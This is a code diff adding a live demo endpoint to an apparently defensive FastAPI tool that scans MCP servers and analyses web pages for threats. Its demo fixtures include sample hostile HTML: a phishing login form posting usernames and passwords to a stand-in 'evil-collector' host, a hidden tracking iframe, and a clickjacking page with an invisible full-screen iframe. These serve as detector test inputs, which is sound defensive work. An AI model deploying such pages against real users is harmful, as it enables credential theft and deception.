@@ -26,7 +26,7 @@ import httpx
 import sqlite_utils  # type: ignore[import-not-found]
 import yaml
 from fastapi import FastAPI, Request, Response
-from fastapi.responses import JSONResponse
+from fastapi.responses import JSONResponse, StreamingResponse
 from pydantic import BaseModel
 
 from . import evidence, registry, scanner
@@ -4299,3 +4299,299 @@ async def demo_run_scenario(db_path: str = str(DEFAULT_DB_PATH)) -> JSONResponse
         "steps": steps,
         "message": "Demo scenario seeded. Refresh dashboard to see live data.",
     })
+
+
+# ---------------------------------------------------------------------------
+# Live Pipeline Demo — SSE endpoint running real analysis in real-time
+# ---------------------------------------------------------------------------
+
+_DEMO_HTML_PAGES = [
+    {
+        "url": "https://login-secure.example.com/signin",
+        "label": "Phishing Login Page",
+        "html": (
+            "<html><body>"
+            '<h1>Login to Your Account</h1>'
+            '<form action="https://evil-collector.example.net/steal" method="post">'
+            '<input type="text" name="username" placeholder="Email">'
+            '<input type="password" name="password" placeholder="Password">'
+            "<button>Sign In</button></form>"
+            '<iframe src="https://tracking.evil.com/pixel" '
+            'style="display:none;width:0;height:0"></iframe>'
+            "</body></html>"
+        ),
+    },
+    {
+        "url": "https://docs.example.com/api/reference",
+        "label": "Clean Documentation",
+        "html": (
+            "<html><body>"
+            "<h1>API Reference</h1>"
+            "<p>Welcome to the API documentation.</p>"
+            '<nav><a href="/getting-started">Getting Started</a></nav>'
+            "</body></html>"
+        ),
+    },
+    {
+        "url": "https://free-tools.example.net/converter",
+        "label": "Clickjacking Page",
+        "html": (
+            "<html><body>"
+            "<h1>Free File Converter</h1>"
+            '<button id="download">Download Now</button>'
+            '<iframe src="https://ads.malicious.net/click" '
+            'style="position:absolute;top:0;left:0;width:100%;height:100%;'
+            'opacity:0;z-index:999"></iframe>'
+            "</body></html>"
+        ),
+    },
+]
+
+
+def _sse_event(event: str, data: dict) -> str:
+    """Format a Server-Sent Event."""
+    return f"event: {event}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n"
+
+
+@app.get("/api/demo/run-live")
+async def demo_run_live(db_path: str = str(DEFAULT_DB_PATH)) -> StreamingResponse:
+    """Run live demo with Server-Sent Events — real analysis in real-time.
+
+    Each pipeline step executes real functions and streams results.
+    """
+
+    async def event_stream():  # noqa: C901
+        from . import ai_council
+        from . import causal_sandbox as _sandbox
+
+        db = registry.init_db(db_path)
+        now = datetime.now(timezone.utc)
+        ts = now.isoformat()
+        total_events = 0
+
+        # ── Step 1: Register MCP Servers ──
+        yield _sse_event("phase", {"name": "register", "label": "Registering MCP Servers"})
+        server_ids: dict[str, int] = {}
+        for srv in _DEMO_SERVERS:
+            sid = registry.upsert_server(
+                db, srv["name"], srv["base_url"], "draft",
+                srv["origin_url"], srv["origin_sha"],
+            )
+            server_ids[srv["name"]] = sid
+            tools_json = json.dumps(srv["tools"], ensure_ascii=False)
+            status = "active" if srv["trust"] == "trusted" else "proposed"
+            db["allowlist"].insert(
+                {
+                    "server_id": sid, "status": status,
+                    "tools_exposed": tools_json,
+                    "risk_level": "low" if srv["trust"] == "trusted" else "high",
+                    "capabilities": "code_read,code_write" if "code" in srv["name"] else "network_read",
+                    "created_at": ts, "updated_at": ts,
+                    "tools_manifest_hash": "",
+                },
+                replace=True,
+            )
+            yield _sse_event("step", {
+                "phase": "register", "server": srv["name"],
+                "trust": srv["trust"], "tools_count": len(srv["tools"]),
+                "icon": "shield" if srv["trust"] == "trusted" else "alert",
+            })
+            total_events += 1
+            await asyncio.sleep(0.3)
+
+        # ── Step 2: Security Scans (real scanner — sync, fast) ──
+        yield _sse_event("phase", {"name": "scan", "label": "Running Security Scans"})
+        for srv_name, sid in server_ids.items():
+            try:
+                result = scanner.run_scan(db, sid, ["static"])
+                summary = result.get("summary", {})
+                scan_status = summary.get("status", "unknown")
+                findings_count = summary.get("findings_total", 0)
+            except Exception as exc:
+                logger.warning("Scan failed for %s: %s", srv_name, exc)
+                scan_status = "error"
+                findings_count = 0
+
+            yield _sse_event("step", {
+                "phase": "scan", "server": srv_name,
+                "status": scan_status, "findings": findings_count,
+                "icon": "pass" if scan_status == "pass" else (
+                    "warn" if scan_status == "warn" else "fail"
+                ),
+            })
+            total_events += 1
+            await asyncio.sleep(0.4)
+
+        # ── Step 3: AI Council Evaluation (real — Gemini or rule-based) ──
+        yield _sse_event("phase", {"name": "council", "label": "AI Council Evaluation"})
+        for srv_name, sid in server_ids.items():
+            try:
+                result = ai_council.evaluate(db, sid)
+                decision = result.get("decision", "unknown")
+                eval_method = result.get("eval_method", "rule_based")
+                rationale = result.get("rationale", "")
+                scores = result.get("scores", {})
+            except Exception as exc:
+                logger.warning("Council failed for %s: %s", srv_name, exc)
+                decision = "error"
+                eval_method = "error"
+                rationale = str(exc)
+                scores = {}
+
+            # Update allowlist
+            if decision in ("allow", "deny", "quarantine"):
+                new_status = "active" if decision == "allow" else (
+                    "blocked" if decision == "deny" else decision
+                )
+                db.execute(
+                    "UPDATE allowlist SET status = ?, updated_at = ? WHERE server_id = ?",
+                    (new_status, ts, sid),
+                )
+
+            yield _sse_event("step", {
+                "phase": "council", "server": srv_name,
+                "decision": decision, "eval_method": eval_method,
+                "rationale": rationale[:120],
+                "security_score": scores.get("security", 0),
+                "icon": "allow" if decision == "allow" else "deny",
+            })
+            total_events += 1
+            await asyncio.sleep(0.5)
+
+        # ── Step 4: Advanced Attack Detection (real detectors) ──
+        yield _sse_event("phase", {"name": "attack", "label": "Attack Pattern Detection"})
+        suspicious_srv = next(
+            (s for s in _DEMO_SERVERS if s["name"] == "suspicious-mcp"), None,
+        )
+        if suspicious_srv:
+            previous_tools = [
+                {"name": "data_helper", "description": "List analytics data from dashboard"},
+            ]
+            adv_result = scanner.run_advanced_threat_scan(
+                suspicious_srv["tools"], previous_tools,
+            )
+            for finding in adv_result.get("findings", []):
+                evidence.append(
+                    {
+                        "event": "attack_detection",
+                        "actor": "scanner",
+                        "trigger_source": "ui",
+                        "decision": "deny",
+                        "code": finding.get("code", ""),
+                        "tool_name": finding.get("tool_name", ""),
+                        "server_id": "suspicious-mcp",
+                        "status": "blocked",
+                        "reason": finding.get("message", ""),
+                        "ts": (now - timedelta(seconds=30 * (adv_result["findings"].index(finding) + 1))).isoformat(),
+                    },
+                    path=_evidence_path(),
+                )
+                yield _sse_event("step", {
+                    "phase": "attack", "server": "suspicious-mcp",
+                    "code": finding.get("code", ""),
+                    "tool": finding.get("tool_name", ""),
+                    "severity": finding.get("severity", ""),
+                    "message": finding.get("message", "")[:120],
+                    "icon": "attack",
+                })
+                total_events += 1
+                await asyncio.sleep(0.4)
+
+        # ── Step 5: Web Sandbox Analysis (real DOM/a11y/network analysis) ──
+        yield _sse_event("phase", {"name": "web_sandbox", "label": "Web Sandbox Analysis"})
+        for page in _DEMO_HTML_PAGES:
+            html_content = page["html"]
+            page_url = page["url"]
+            try:
+                dom_threats = _sandbox.analyze_dom_security(html_content, page_url)
+                a11y_nodes = _sandbox.extract_accessibility_tree(html_content)
+                a11y_deceptive = [n for n in a11y_nodes if n.deceptive_label]
+                network_traces = _sandbox.trace_network_requests(page_url, html_content)
+                visible_text = _sandbox.extract_visible_text(html_content)
+                verdict = _sandbox.gemini_security_verdict(
+                    page_url, visible_text, dom_threats, a11y_deceptive, network_traces,
+                )
+                eval_method = (
+                    "rule_based"
+                    if verdict.summary.startswith("Rule-based")
+                    else "gemini"
+                )
+            except Exception as exc:
+                logger.warning("Web sandbox failed for %s: %s", page_url, exc)
+                verdict = _sandbox.WebSecurityVerdict(
+                    classification=_sandbox.ThreatClassification.benign,
+                    confidence=0.0,
+                    risk_indicators=["analysis_error"],
+                    evidence_refs=[],
+                    recommended_action="warn",
+                    summary=f"Analysis error: {exc}",
+                )
+                dom_threats = []
+                network_traces = []
+                eval_method = "error"
+
+            # Store in web sandbox cache
+            run_id = f"ws-live-{uuid.uuid4().hex[:8]}"
+            verdict_record = {
+                "run_id": run_id,
+                "url": page_url,
+                "classification": verdict.classification.value,
+                "confidence": verdict.confidence,
+                "recommended_action": verdict.recommended_action,
+                "summary": verdict.summary,
+                "risk_indicators": [str(r) for r in verdict.risk_indicators],
+                "evidence_refs": [str(e) for e in verdict.evidence_refs],
+                "eval_method": eval_method,
+                "dom_threats_count": len(dom_threats),
+                "network_traces_count": len(network_traces),
+                "timestamp": now.isoformat(),
+            }
+            _WEB_SANDBOX_VERDICTS.append(verdict_record)
+            evidence.append(
+                {
+                    "event": "causal_web_scan",
+                    "actor": "web-sandbox",
+                    "trigger_source": "ui",
+                    "run_id": run_id,
+                    "url": page_url,
+                    "classification": verdict.classification.value,
+                    "confidence": verdict.confidence,
+                    "recommended_action": verdict.recommended_action,
+                    "decision": "block" if verdict.recommended_action == "block" else verdict.recommended_action,
+                    "reason": verdict.summary,
+                    "ts": now.isoformat(),
+                },
+                path=_evidence_path(),
+            )
+
+            yield _sse_event("step", {
+                "phase": "web_sandbox",
+                "url": page_url,
+                "label": page["label"],
+                "classification": verdict.classification.value,
+                "confidence": verdict.confidence,
+                "action": verdict.recommended_action,
+                "eval_method": eval_method,
+                "dom_threats": len(dom_threats),
+                "network_traces": len(network_traces),
+                "icon": "block" if verdict.recommended_action == "block" else (
+                    "warn" if verdict.recommended_action == "warn" else "pass"
+                ),
+            })
+            total_events += 1
+            await asyncio.sleep(0.5)
+
+        # ── Complete ──
+        yield _sse_event("complete", {
+            "total_events": total_events,
+            "message": "Pipeline complete — all panels updated with live data",
+        })
+
+    return StreamingResponse(
+        event_stream(),
+        media_type="text/event-stream",
+        headers={
+            "Cache-Control": "no-cache",
+            "X-Accel-Buffering": "no",
+        },
+    )
